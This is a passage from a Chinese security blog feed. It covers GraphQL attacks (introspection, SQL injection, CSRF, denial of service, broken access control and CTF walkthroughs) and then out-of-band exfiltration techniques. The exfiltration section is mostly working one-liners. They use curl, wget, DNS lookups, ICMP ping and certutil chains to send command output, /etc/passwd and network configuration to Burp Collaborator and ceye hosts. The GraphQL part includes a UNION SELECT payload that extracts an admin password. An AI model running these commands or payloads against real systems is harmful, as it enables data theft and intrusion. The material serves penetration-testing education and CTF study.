title="内省查询"></a>内省查询</h1><p>简单来说就是，GraphQL内置了接口文档，你可以通过内省的方法获得这些信息，如对象定义、接口参数等信息。<br>当使用者不知道某个GraphQL接口中的类型哪些是可用的，可以通过__schema字段来向GraphQL查询哪些类型是可用的。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713714820-cdfddfcf-655f-4c7d-9908-5664584bf387.png" alt="image.png"></p><ul><li><strong>Query, Character, Human, Episode, Droid</strong> - 这些是我们在类型系统中定义的类型。</li><li><strong>String, Boolean</strong> - 这些是内建的标量，由类型系统提供。</li><li><strong>__Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive</strong> - 这些有着两个下划线的类型是内省系统的一部分。</li></ul><p> 现在，来试试找到一个可以探索出有哪些可用查询的地方。当我们设计类型系统的时候，我们确定了一个所有查询开始的地方，来问问内省系统它是什么！<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667716706372-432567f7-169b-4329-8f68-e3896efbb8a3.png" alt="image.png"><br> 这和我们在类型系统那章里说的一样，Query 类型是我们开始的地方！注意这里的命名只是一个惯例，我们也可以把 Query 取成别的名字，只要我们把它定义为所有查询出发的地方，它也依然会在这里被返回。尽管如此，还是把它命名为 Query 吧，这是一个有用的惯例。<br> 有时候也需要检验一个特定的类型。来看看Film 类型：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667717143389-b7204fa0-d0b6-4ccd-aa47-2d4df3c522ec.png" alt="image.png"><br>kind 返回一个枚举类型 __TypeKind，其中一个值是 OBJECT。<br>我们可以使用如下语法查询 Film有哪些字段:</p><pre><code class="plsql">&#123;__type(name:&quot;Film&quot;)&#123;  name  fields&#123;    name    type&#123;      name      kind      ofType&#123;        name        kind      &#125;    &#125;  &#125;&#125;&#125;</code></pre><p><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667717378913-a48fa951-fa30-476e-8fe1-67dc352c8db4.png" alt="image.png"></p><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><p>通过内省查询，我们可以得到很多后端接口的信息。有了这些信息通过排查便可能发现更多的安全问题，比如信息泄露。<br>查询存在的类型：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721031832-bc64e985-25a7-4973-a444-a091b0981067.png" alt="f4ff5867e655f8a9f5f6a16d2962fbcb.png"><br> 查询类型所有的字段：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721050225-ac282716-4931-4078-946e-d56c15879ebe.png" alt="0e0e9ce978095d30a0ee822632c377b3.png"><br>在查找字段里是否包含一些敏感字段：<br>Email、token、password、authcode、license、key、session、secretKey、uid、address等。<br>除此以外还可以搜索类型中是否有edit、delete、remove、add等功能，来达到数据编辑、删除、添加的功能。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721072426-2679efb7-eb2f-499e-8157-1abfef751e8a.png" alt="b3c7e4cea45cb7a277d4caf5c1ced24e.png"></p><h1 id="进入sql注入"><a href="#进入sql注入" class="headerlink" title="进入sql注入"></a>进入sql注入</h1><p> graphql的sql注入与一般的sql注入类似，都是可以通过构造恶意语句达到注入获取数据或改变查询逻辑的目的<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667720031540-be394278-36d8-4175-a0fa-2e7ee356c79e.png" alt="48a153df3e0d941632643de526417093.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667720041854-443c7a0a-aa2b-4ac0-b1c8-d600b798ce18.png" alt="c9c5ced48d8363e287de237d970eae7e.png"><br> 只有直接使用graphql进行查询才会出现的问题，正确的使用参数化查询，不会遇到sql注入的问题。 </p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>burp插件<br><a href="https://github.com/doyensec/inql">https://github.com/doyensec/inql</a><br>Express-GraphQL Endpoint CSRF漏洞<br>在Express-GraphQL中存在CSRF漏洞。如果将Content-Type修改为application/x-www-form-urlencoded ，再将POST请求包内容URL编码并生成csrf poc 即可实施csrf攻击，对敏感操作如mutation（变更）造成危害。<br>大概就是：默认graphql查询时，都是依赖于json数据格式进行传输给后端的，但是使用Express-GraphQL的时候，给json转换成form表单格式的数据也可以提交给后端正常处理，也就可以直接用burp生成的CSRF POC进行CSRF攻击了</p><pre><code class="plsql">原数据包：POST /? HTTP/1.1Host: graphqlapp.herokuapp.comOrigin: https://graphqlapp.herokuapp.comUser-Agent: Graphiql/httpReferer: https://graphqlapp.herokuapp.com/Cookie: [mask]Content-Type: application/jsonContent-Length: 108&#123;&quot;query&quot;:&quot;mutation &#123;\n editProfile(name:\&quot;hacker\&quot;, age: 5) &#123;\n name\nage\n &#125;\n&#125;&quot;,&quot;variables&quot;:null&#125;修改后也能使用的数据包：POST /? HTTP/1.1Host: graphqlapp.herokuapp.comOrigin: https://graphqlapp.herokuapp.comUser-Agent: Graphiql/httpReferer: https://graphqlapp.herokuapp.com/Cookie: [mask]Content-Type: application/x-www-form-urlencodedContent-Length: 138query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%205)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D</code></pre><p>  修复方式可以考虑将CORS配置为仅允许来自受信任域的白名单的请求，或者确保正在使用CSRF令牌.实施多种保护将降低成功攻击的风险.  </p><h1 id="嵌套查询拒绝服务"><a href="#嵌套查询拒绝服务" class="headerlink" title="嵌套查询拒绝服务"></a>嵌套查询拒绝服务</h1><p> 当业务的变量互相关联，如以下graphql定义为这样时，就可能无限展开，造成拒绝服务。  </p><pre><code class="plsql">type Thread &#123;  messages(first: Int, after: String): [Message]&#125;</code></pre><pre><code class="plsql">type Message &#123;  thread: Thread&#125;</code></pre><pre><code class="plsql">type Query &#123;  thread(id: ID!): Thread&#125;</code></pre><p>默认情况下，GraphQL 中的所有类型都是可为空的；空值是上述所有类型的有效响应。要声明不允许 null 的类型，可以使用 GraphQL Non?Null 类型。此类型包装基础类型，并且此类型的行为与该包装类型相同，但 null 不是包装类型的有效响应。尾随感叹号用于表示使用 Non?Null 类型的字段，如下所示：name: String!。<br>换句话说，GraphQL 中的类型默认可以为空。类型后的感叹号专门指定该类型为不可为空。<br>就有可能存在拒绝服务的风险。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721590946-361ce721-3ed2-49cf-8854-2d236bbb7b64.png" alt="image.png"><br> 修复方式可以考虑增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100  </p><h1 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h1><p> graphql本身建议由业务层做权限控制，graphql作为一个单路由的API接口完成数据查询操作。开发者在使用时经常会忽略接口的鉴权问题。有时候客户端调用查询接口，直接传入了id等信息并未做好权限校验，就有可能存在水平越权  <img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721666095-3645112b-a1ad-442c-83f3-9dc03dc41c9b.png" alt="284177284d3f098468827b8ffd745162.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721670294-8c48d534-af32-43d5-a26e-e3641a2e4c8d.png" alt="f6e974c205db0a29f17de74ab4fe5ee9.png"><br> 修复方式建议在GraphQL和数据之间多加一个权限校验层，或者由业务自行实现权限校验。  </p><h1 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h1><h2 id="corCTT2021-devme"><a href="#corCTT2021-devme" class="headerlink" title="corCTT2021 devme"></a>corCTT2021 devme</h2><p><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667723151532-f6d37fe9-d7b0-46e8-bed6-7f923b88c3d7.png" alt="devme-1.png"><br>随便输入一个email</p><pre><code class="plsql">POST /graphql HTTP/1.1Content-Type: application/json&#123;    &quot;query&quot;: &quot;mutation createUser($email: String!) &#123;\n\tcreateUser(email: $email) &#123;\n\t\tusername\n\t&#125;\n&#125;\n&quot;,    &quot;variables&quot;: &#123;        &quot;email&quot;: &quot;test@test.com&quot;    &#125;&#125;</code></pre><p>尝试内省查询</p><pre><code class="plsql">&#123;    __schema &#123;        types &#123;            name        &#125;    &#125;&#125;</code></pre><p>返回包</p><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;__schema&quot;: &#123;            &quot;types&quot;: [                &#123;                    &quot;name&quot;: &quot;Query&quot;                &#125;,                ... lots of default types                &#123;                    &quot;name&quot;: &quot;User&quot;                &#125;            ]        &#125;    &#125;&#125;</code></pre><p>我们来查询一下User类型</p><pre><code class="plsql">&#123;    __type(name: &quot;User&quot;) &#123;        fields &#123;            name        &#125;    &#125;&#125;</code></pre><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;__type&quot;: &#123;            &quot;fields&quot;: [                &#123;                    &quot;name&quot;: &quot;token&quot;                &#125;,                &#123;                    &quot;name&quot;: &quot;username&quot;                &#125;            ]        &#125;    &#125;&#125;</code></pre><p>我们先来看下哪些查询是被支持的</p><pre><code class="plsql">&#123;    __type(name: &quot;Query&quot;) &#123;        fields &#123;            name        &#125;    &#125;&#125;</code></pre><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;__type&quot;: &#123;            &quot;fields&quot;: [                &#123;                    &quot;name&quot;: &quot;users&quot;                &#125;,                &#123;                    &quot;name&quot;: &quot;flag&quot;                &#125;            ]        &#125;    &#125;&#125;</code></pre><p>我们在里面发现了flag,试着查询一下</p><pre><code class="plsql">&#123;    flag&#125;</code></pre><pre><code class="plsql">&#123;    &quot;errors&quot;: [        &#123;            &quot;message&quot;: &quot;Field \&quot;flag\&quot; argument \&quot;token\&quot; of type \&quot;String!\&quot; is required, but it was not provided.&quot;,            &quot;locations&quot;: [                &#123;                    &quot;line&quot;: 1,                    &quot;column&quot;: 2                &#125;            ]        &#125;    ]&#125;</code></pre><p>结果就是我们不能查询，我们需要提供token的值，那让我们查询下User里的token</p><pre><code class="plsql">&#123;    users &#123;        username        token    &#125;&#125;</code></pre><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;users&quot;: [            &#123;                &quot;username&quot;: &quot;admin&quot;,                &quot;token&quot;: &quot;3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b&quot;            &#125;,&#123;                &quot;username&quot;: &quot;b82d9af8a6226c072bcd811e7a009ffb36b2ad88be67ac396d170fe8e2f1de7c&quot;,                &quot;token&quot;: &quot;5568f87dc1ca15c578e6b825ffca7f685ac433c1826b075b499f68ea309e79a6&quot;            &#125;            ... more users        ]    &#125;&#125;</code></pre><p>我们使用admin的token去获得flag</p><pre><code class="plsql">&#123;    flag(token: &quot;3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b&quot;)&#125;</code></pre><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;flag&quot;: &quot;&quot;    &#125;&#125;</code></pre><h2 id="祥云杯2022-Funweb"><a href="#祥云杯2022-Funweb" class="headerlink" title="祥云杯2022 Funweb"></a>祥云杯2022 Funweb</h2><p>前面用到的jwt漏洞是这个CVE-2022-39227，这里就不提及，主要看graohQL注入<br>还是先内省查询</p><pre><code class="plsql">&#123;    __schema &#123;        types &#123;            name        &#125;    &#125;&#125;</code></pre><p>回显</p><pre><code class="plsql">&#123;&#39;__schema&#39;:    &#123;&#39;types&#39;: [&#123;&#39;name&#39;: &#39;Query&#39;&#125;,              &#123;&#39;name&#39;: &#39;Getscorebyname&#39;&#125;,             &#123;&#39;name&#39;: &#39;String&#39;&#125;,             &#123;&#39;name&#39;: &#39;Getscorebyid&#39;&#125;,             &#123;&#39;name&#39;: &#39;Int&#39;&#125;,             &#123;&#39;name&#39;: &#39;Boolean&#39;&#125;,             &#123;&#39;name&#39;: &#39;__Schema&#39;&#125;,             &#123;&#39;name&#39;: &#39;__Type&#39;&#125;,             &#123;&#39;name&#39;: &#39;__TypeKind&#39;&#125;,             &#123;&#39;name&#39;: &#39;__Field&#39;&#125;,             &#123;&#39;name&#39;: &#39;__InputValue&#39;&#125;,             &#123;&#39;name&#39;: &#39;__EnumValue&#39;&#125;,             &#123;&#39;name&#39;: &#39;__Directive&#39;&#125;,             &#123;&#39;name&#39;: &#39;__DirectiveLocation&#39;&#125;]&#125;&#125;</code></pre><p>再查询Getscorebyid</p><pre><code class="plsql">&#123; Getscorebyid(id: 1)    &#123;         id         name         score &#125;&#125;</code></pre><p>  回显:</p><pre><code class="plsql">&#123;    &#39;getscoreusingid&#39;:             &#123;                    &#39;id&#39;: &#39;1&#39;,                     &#39;name&#39;: &#39;admin&#39;,                     &#39;score&#39;: &#39;100&#39;            &#125;&#125;# 这里用getscorebyid不行，故改为getscoreusingid</code></pre><p>然后获取字段:</p><pre><code class="plsql">&#123;  __type (name: &quot;Getscorebyid&quot;) &#123;    name    fields &#123;      name      type &#123;        name        kind        ofType &#123;          name          kind        &#125;      &#125;    &#125;  &#125;&#125;</code></pre><p>最后拿管理员密码的paylaod</p><pre><code class="plsql">&#123;     getscoreusingnamehahaha(name:&quot;admin&#39;union select password from users where name=&#39;admin&#39; and &#39;1&#39;=&#39;1&quot;)    &#123;                   name                 score     &#125;&#125;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.secpulse.com/archives/148242.html">https://www.secpulse.com/archives/148242.html</a><br><a href="https://blog.csdn.net/weixin_34080903/article/details/89390255">https://blog.csdn.net/weixin_34080903/article/details/89390255</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;什么是GraphQL注入&quot;&gt;&lt;a href=&quot;#什么是GraphQL注入&quot; class=&quot;headerlink&quot; title=&quot;什么是GraphQL注入&quot;&gt;&lt;/a&gt;什么是GraphQL注入&lt;/h1&gt;&lt;p&gt; GraphQL 是一个用于API</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="GraphQL注入" scheme="https://sakurahack-y.github.io/tags/GraphQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>OOB外带攻击</title>
    <link href="https://sakurahack-y.github.io/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/"/>
    <id>https://sakurahack-y.github.io/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/</id>
    <published>2022-11-22T13:38:11.000Z</published>
    <updated>2022-11-22T13:40:23.222Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="对内攻击"><a href="#对内攻击" class="headerlink" title="对内攻击"></a>对内攻击</h2><p>在一次攻击当中,只有一条通道，属于in-band（带内）攻击，我们常见的攻击类型就是这种类型，大多数的攻击都属于带内攻击，在一条通信通道内进行的攻击。<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665493942514-f4c248c0-0602-43e7-80d2-9ced56ad72db.png" alt="image.png"></p><h2 id="对外攻击"><a href="#对外攻击" class="headerlink" title="对外攻击"></a>对外攻击</h2><p>但是有的时候我们的攻击也可能不在一条通道上，同一次攻击下，不止一条信道，则属于out-band（带外）攻击，由我们的一端向服务器发送请求，让服务器执行我们请求中的向另外一个公网的请求<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665493992376-c096cc51-f3aa-4874-a946-7515110a80ed.png" alt="image.png"></p><h2 id="盲"><a href="#盲" class="headerlink" title="盲"></a>盲</h2><p><strong>程序不进行详细的回显信息，而只是返回对或者错时，我们都可以叫它盲</strong>。我们在做<a href="https://cloud.tencent.com/product/wpt?from=10680">渗透测试</a>的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，例如提交反馈表单，需要等管理员打开查看提交信息时才会触发，或者是盲注跨站，盲打 XSS 这种。再例如 SSRF，如果程序不进行回显任何信息，而只提示你输入的是否合法，那么也无法直接判断程序存在 SSRF 漏洞，我们可以叫盲 SSRF。再例如 XXE，引入外部文件时，如果程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在 XXE 漏洞，我们也可以叫盲 XXE。<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665494309999-5c046ff8-2199-4632-a876-c973f64bfef4.png" alt="image.png"></p><h1 id="基本回显思路"><a href="#基本回显思路" class="headerlink" title="基本回显思路"></a>基本回显思路</h1><h2 id="对于出网机器"><a href="#对于出网机器" class="headerlink" title="对于出网机器"></a>对于出网机器</h2><p><strong>使用http传输，如wget，curl，certutil将回显信息爬出</strong><br>** 优点：**方便，回显全。</p><p>** 缺点：**1.对于不出网服务器没有办法传输，同时需要了解其返回包字段信息，需要使用返回包字段将回显信息带出</p><h2 id="对于不出网机器"><a href="#对于不出网机器" class="headerlink" title="对于不出网机器"></a>对于不出网机器</h2><p><strong>使用DNS传输，ICMP传输，powershell中的wget，curl等传输</strong><br>** 优点：**不出网机器可以传输</p><p>**  缺点：**1.回显是一条条执行，需要将回显结果拼接解码，回显信息比较麻烦<br>2.短回显可以使用DNS传输，长回显大部分带出需要powershell搭配，但杀毒软件往往禁用powershell，因此利用条件较苛刻</p><h2 id="burpsuit-Collaborator-Client模块回显"><a href="#burpsuit-Collaborator-Client模块回显" class="headerlink" title="burpsuit Collaborator Client模块回显"></a><strong>burpsuit Collaborator Client模块回显</strong></h2><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665498456481-fbab1c32-ed54-45d1-8dc7-768384d85b5f.png" alt="image.png"><br>点击复制一下由burp生成的二级域名地址<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665498493742-96ec077b-0db2-4c69-b38b-5d88dd35ba41.png" alt="image.png"><br>和在线网站的用法其实都差不多,这里就不过多赘述</p><pre><code class="php">//httpcurl `whoami`.u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.netcurl u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.net/`whoami`//dnsping `whoami`.u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.net</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665499156367-f822781b-dcff-456f-823d-ec8ebfe5c66b.png" alt="image.png"></p><h2 id="Linux-在线网站DNS-HTTP管道解析"><a href="#Linux-在线网站DNS-HTTP管道解析" class="headerlink" title="(Linux)在线网站DNS/HTTP管道解析"></a><strong>(Linux)在线网站DNS/HTTP管道解析</strong></h2><p>经常在拿下shell的时候碰到命令执行无回显的情况，因此为了解决命令执行无回显时，可以借助DNS管道解析来让命令回显<br>在线网站有<a href="http://dnslog.cn/">dnslog</a>和<a href="http://ceye.io/">ceye</a></p><h3 id="HTTP带外攻击"><a href="#HTTP带外攻击" class="headerlink" title="HTTP带外攻击"></a>HTTP带外攻击</h3><p>linux可以使用以下方法：</p><h4 id="通过curl远程命令执行RCE"><a href="#通过curl远程命令执行RCE" class="headerlink" title="通过curl远程命令执行RCE"></a>通过curl远程命令执行RCE</h4><h5 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h5><pre><code class="php">通过http记录查看是否执行（最好执行两次），curl走http协议curl XXX.ceye.io/`whoami`curl `whoami`.XXX.ceye.io</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495542386-666d7faa-efd7-4deb-8cde-9dd81383aa59.png" alt="image.png"><br>我分别执行了whoami和cat /etc/passwd命令<br>效果也能明显，但是当数据较多时，只回显了第一条数据<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495602469-9d322896-4297-4174-aa29-7ecc02a375be.png" alt="image.png"></p><h5 id="如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的"><a href="#如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的" class="headerlink" title="如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的"></a>如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的</h5><pre><code class="php">curl XXX.ceye.io/`ls -al|sed -n &#39;2p&#39;` //这里回显的就是第二行数据了</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495827542-f8cd7de4-7f6e-434b-91e1-af154afbaa21.png" alt="image.png"></p><h5 id="使用base64传输"><a href="#使用base64传输" class="headerlink" title="使用base64传输"></a>使用base64传输</h5><pre><code class="php">curl XXX.ceye.io/`ls -al|sed -n &#39;2p&#39;|base64`   </code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495978518-7628cd8a-baf8-4ff0-9b81-14198b4f3a11.png" alt="image.png"></p><h5 id="有的时候长度太大，cut来分割字符-第一个字符下标为1"><a href="#有的时候长度太大，cut来分割字符-第一个字符下标为1" class="headerlink" title="有的时候长度太大，cut来分割字符(第一个字符下标为1)"></a>有的时候长度太大，cut来分割字符(第一个字符下标为1)</h5><pre><code class="php">curl XXX.ceye.io/`ls -al |cut -c 3-10`</code></pre><h4 id="wget传输"><a href="#wget传输" class="headerlink" title="wget传输"></a>wget传输</h4><p><strong>使用wget将命令回显信息通过包头数据字符串User-Agent传输至攻击服务器上，xargs echo–n代表去掉各个分隔符，换行符等符号输出</strong></p><pre><code class="php">wget --header=&quot;HY:`cat /etc/passwd | xargs echo –n`&quot; zqtpylwvynwgaxifh1kfjquhn8t5hu.burpcollaborator.net</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665681959294-c266f596-ad7f-494d-8789-88f7fbbb6e9d.png" alt="image.png"><br>查看访问记录<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665681982982-db081893-ec22-4504-ac3c-311a9315ebd3.png" alt="image.png"></p><h3 id="dns带外攻击"><a href="#dns带外攻击" class="headerlink" title="dns带外攻击"></a>dns带外攻击</h3><h4 id="单条信息"><a href="#单条信息" class="headerlink" title="单条信息"></a>单条信息</h4><p><strong>通过DNS记录查看是否执行（最好执行两次），ping走的是DNS协议</strong></p><pre><code class="php">ping `whoami`.XXXX.ceye.io</code></pre><p>这里也可以用网站dnslog<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665496640653-19614883-8ea1-4bca-9243-1ea1293e2d7a.png" alt="image.png"><br>但是也只有第一条数据,只适合单条的短信息回显</p><h4 id="base64进行多条信息"><a href="#base64进行多条信息" class="headerlink" title="base64进行多条信息"></a>base64进行多条信息</h4><pre><code class="php">var=11111 &amp;&amp; for i in $(ifconfig|base64|awk &#39;&#123;gsub(/.&#123;50&#125;/,&quot;&amp;\n&quot;)&#125;1&#39;); do var=$((var+1)) &amp;&amp; nslookup $var.$i.402c35vpn9hpplp9ilj09pxx9ofe33.burpcollaborator.net; done</code></pre><p>如果找不到nslookup命令<br>使用命令安装</p><pre><code class="php">yum -y install bind-utils</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680141774-bb8bb6ac-3917-402a-a4f7-3475c12e6da8.png" alt="image.png"><br>将base64一条条解码即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680150290-edc7e652-0622-4a10-9cab-0c457e63afe2.png" alt="image.png"></p><h4 id="16进制传输"><a href="#16进制传输" class="headerlink" title="16进制传输"></a>16进制传输</h4><pre><code class="php">var=11111 &amp;&amp; for b in $(ifconfig|xxd -p ); do var=$((var+1)) &amp;&amp; dig $var.$b.var=11111 &amp;&amp; for b in $(ifconfig|xxd -p ); do var=$((var+1)) &amp;&amp; dig $var.$b.ezh4705a725vjcruqgtus53wwn2hq6.burpcollaborator.net; done; done</code></pre><p>如果找不到xxd命令<br>使用:</p><pre><code class="php">yum install vim-common</code></pre><p>来安装<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680505374-362ac081-08bc-47e0-80d5-854195f69fef.png" alt="image.png"><br>在burp中可以看到<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680486320-70e0ef60-a251-4fe8-84fd-2f19d4dbfc82.png" alt="image.png"><br>一行行复制查看即可，结果还算准确<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680468991-273879c2-4f23-4a59-9cf3-072479341360.png" alt="image.png"></p><h4 id="ICMP传输"><a href="#ICMP传输" class="headerlink" title="ICMP传输"></a>ICMP传输</h4><pre><code class="php">linux靶机cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 easn1l1elxy8t7azlztz02gkbbh65v.burpcollaborator.net;done攻击者sudo tcpdump &#39;icmp and src host 202.14.120.xx&#39; -w icmp_file.pcap#To capture攻击者提取数据echo &quot;0x$(tshark -n -q -r icmp_file.pcap -T fields -e data.data | tr -d &#39;\n&#39; | tr -d &#39;:&#39;)&quot; | xxd -r -p   #Or Use Wireshark gui</code></pre><h2 id="windows系统外带"><a href="#windows系统外带" class="headerlink" title="windows系统外带"></a>windows系统外带</h2><h3 id="http传输"><a href="#http传输" class="headerlink" title="http传输"></a>http传输</h3><h4 id="curl传输"><a href="#curl传输" class="headerlink" title="curl传输"></a>curl传输</h4><pre><code class="php">windows中 %xxx% 的xxx代表系统变量,常用系统变量命令              %SystemDrive%                                     系统安装的磁盘分区              %SystemRoot% = %Windir% WINDODWS                  系统目录              %ProgramFiles%　                                  应用程序默认安装目录              %AppData%                                         应用程序数据目录              %CommonProgramFiles%                              公用文件目录              %HomePath%                                        当前活动用户目录              %Temp% =%Tmp%                                     当前活动用户临时目录              %DriveLetter%                                     逻辑驱动器分区              %HomeDrive%                                       当前用户系统所在分区</code></pre><p><strong>curl抓取用户名：//</strong>%USERNAME%，列出所有用户名</p><pre><code class="php">curl http://x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net/%USERNAME%</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665906863933-a53b3205-a5f8-4fd1-8598-e6145c5d02a4.png" alt="image.png"><br><strong>curl获取windows安装目录：</strong>//%WinDir%，列出windows的安装目录</p><pre><code class="php">curl http://x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net/%WinDir%</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665906919432-fd128314-4070-41fd-bc0a-40207e4c85ad.png" alt="image.png"></p><h4 id="certutil利用"><a href="#certutil利用" class="headerlink" title="certutil利用"></a>certutil利用</h4><p>将ipconfig的结果记录在新建temp文件中，再对temp文件进行base64加密变成temp2文件，再对temp2文件中的多余字符”CERTIFICATE”删掉变成temp3，再对temp3的内容删除换行符生成所有数据只在一行的temp4（因为http响应包想要信息全部输出必须使信息全在一行），并把temp4的内容赋予变量为p1，最后使用curl爬取p1的值赋予http响应包的User-Agent字段输出于http:// qysvrrmxvestl2c93ydg0u5p1g76vv.burpcollaborator.net中，最后删除本地文件夹中所有生成的带有temp字段的文件（也就是之前生成的temp~temp4四个文件）</p><pre><code class="php">ipconfig &gt; temp &amp;&amp; certutil -f -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; (for /f %i in (./temp3) do set /p=%i&lt;nul &gt;&gt;temp4) || set /p pl=&lt;temp4 &amp;&amp; curl -H &quot;User-Agent:%pl%&quot; x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net &amp;&amp; del temp*</code></pre><p>数据在useragent里<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665907105337-f0ebfb0b-f735-4444-8f2d-6fd7d13f712c.png" alt="image.png"><br>解码即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665907126557-aff65172-de84-414f-9b9b-c2ae1751318c.png" alt="image.png"></p><h3 id="DNS传输"><a href="#DNS传输" class="headerlink" title="DNS传输"></a>DNS传输</h3><h4 id="dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）"><a href="#dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）" class="headerlink" title="dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）"></a>dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）</h4><pre><code class="php">for /L %i in (1,1,10) do nslookup    //执行10次nslookup命令cmd /v /c &quot;hostname &gt; temp &amp;&amp; certutil -f -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt;temp3 &amp;&amp; set FINAL=!MYVAR!.fq94atmnmopixkbqusvwe2s23t9jx8.burpcollaborator.net &amp;&amp; nslookup !FINAL!&quot;</code></pre><h4 